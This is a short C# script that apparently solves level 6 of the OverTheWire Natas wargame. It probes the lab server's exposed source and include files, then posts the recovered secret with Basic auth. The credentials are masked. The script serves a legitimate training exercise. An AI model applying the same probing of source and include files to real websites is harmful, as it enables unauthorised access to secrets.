using System.Net.Http;
using System.Text;

HttpClient client = new HttpClient();
client.BaseAddress = new Uri("http://natas6.natas.labs.overthewire.org");

//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index-source.html");
//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/includes/secret.inc");
HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "/index.php");
string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas6:???????????????????????????????????????"));
request.Headers.Add("Authorization", "Basic " + credential);

request.Headers.Add("ContentType", "application/x-www-form-urlencoded");
request.Content = new FormUrlEncodedContent(new[] { new KeyValuePair<string, string>("secret", "?????????????"), new KeyValuePair<string, string>("submit", "Submit") });

HttpResponseMessage httpResponse = await client.SendAsync(request);
httpResponse.EnsureSuccessStatusCode();
String body = await httpResponse.Content.ReadAsStringAsync();
Console.WriteLine(body);
